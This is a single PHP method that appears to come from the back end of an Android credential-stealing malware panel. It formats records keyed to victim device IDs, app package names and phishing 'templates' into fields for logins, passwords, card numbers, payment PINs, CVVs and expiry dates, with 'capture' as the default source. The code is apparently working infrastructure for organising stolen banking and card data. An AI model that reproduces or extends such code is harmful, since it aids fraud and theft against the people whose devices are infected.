    protected function credentialRow(array $r): array
    {
        $ctype = (string)($r['cipher_type'] ?? $r['type'] ?? 'pin');
        $secret = (string)($r['cipher_text'] ?? $r['password'] ?? '');
        $extra = $r['form_data'] ?? $r['extra'] ?? null;
        $fields = [];
        if (is_string($extra) && $extra !== '') {
            $d = json_decode($extra, true);
            if (is_array($d)) $fields = $d;
        }
        $pick = function (array $keys) use ($fields) {
            foreach ($keys as $k) if (!empty($fields[$k])) return (string)$fields[$k];
            return '';
        };
        $labels = $this->credDeviceLabels();
        $did = (string)($r['device_id'] ?? '');
        return [
            'id'           => (int)$r['id'],
            'device_id'    => $did,
            'device_label' => (string)($labels[$did] ?? $did),
            'app_pkg'      => (string)($r['package_name'] ?? ''),
            'package_name' => (string)($r['package_name'] ?? ''),
            'app_name'     => (string)($r['app_name'] ?? $r['template_name'] ?? ''),
            'template_name'=> (string)($r['template_name'] ?? ''),
            'type'         => $ctype,
            'cipher_type'  => $ctype,
            'login'        => $pick(['login', 'username', 'account', 'user', 'email', 'phone']) ?: (string)($r['account'] ?? ''),
            'username'     => (string)($r['account'] ?? ''),
            'password'     => $secret,
            'cipher_text'  => $secret,
            'card'         => $pick(['card', 'card_number', 'card_no', 'bankcard']),
            'pay_pin'      => $ctype === 'pin' ? $secret : $pick(['pay_pin', 'pin', 'payment_password']),
            'cvv'          => $pick(['cvv', 'cvc', 'security_code']),
            'exp_date'     => $pick(['exp_date', 'expiry', 'expire', 'exp']),
            'grade_code'   => (string)($r['grade_code'] ?? ''),
            'source'       => (string)($r['source'] ?? 'capture'),
            'extra'        => is_string($extra) ? $extra : ($extra ? json_encode($extra, JSON_UNESCAPED_UNICODE) : ''),
            'created_at'   => (int)($r['created_at'] ?? 0) * 1000,
        ];
    }

